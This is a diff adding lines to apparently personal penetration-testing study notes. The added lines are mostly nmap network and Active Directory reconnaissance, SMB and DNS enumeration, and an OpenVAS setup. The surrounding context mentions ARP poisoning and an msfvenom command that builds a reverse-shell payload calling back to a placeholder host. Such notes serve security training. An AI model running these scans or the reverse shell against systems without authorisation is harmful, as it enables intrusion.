@@ -988,6 +988,74 @@ Launch Ettercap and select "Sniff > Unified Sniffing."
 Perform ARP poisoning to intercept traffic.
 
 
+----
+nmap -sn 192.168.10.0/24 (Exclude first ip address , LIVE HOST , GATEWAY OR FIRST IP)
+nmap -p 22 192.168.10.0/24 --open TO CHECK OPEN PORT RELATED TO 22
+sudo nmap -p 22 --open -sV 192.168.10.0/24   (The -sV flag reveals the OS/service version.)  -T4 fast scanning 
+
+A Domain Controller exposes Active Directory services, which means it will have:
+	• LDAP (port 389)
+	• Kerberos (port 88)
+	• SMB (port 445)
+	• DNS (port 53)
+	• Global Catalog (port 3268)
+nmap -p 53 192.168.0.0/24 --open
+sudo nmap --script smb-os-discovery -p 445 192.168.0.0/24
+sudo nmap -p 88,389,445 -T4 -sV ip/24 --open
+
+NetBIOS_Domain_Name and DNS_Tree_Name
+	
+sudo nmap -T4 -A -v 192.168.0.222
+
+open ssh version 
+sudo nmap -p 22 -sV 192.168.10.0/24
+
+ip of mysql machine  and OS 
+nmap -p 3306 172.30.10.0/24 --open
+sudo nmap -sV 172.30.10.99
+
+
+sudo nmap -T4 -A -p 1433,1434 --open 192.168.10.0/24
+
+DNS enumerarion 
+
+• host -t ns certifiedhacker.com
+• dig ns certifiedhacker.com
+
+
+smtp 
+nmap -p 25 172.30.10.0/24 --open
+
+smb enuramtion - message signing check 
+
+sudo nmap -sV --script smb2-security-mode -p 445 172.30.10.200
+nmap -p 445 -sV -A 172.30.10.200    - smb 
+
+open vas or initallize from parrot secuirty and wait
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 Conduct Reverse Shell Exploitation
  Establish a reverse shell on a vulnerable system.
 Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
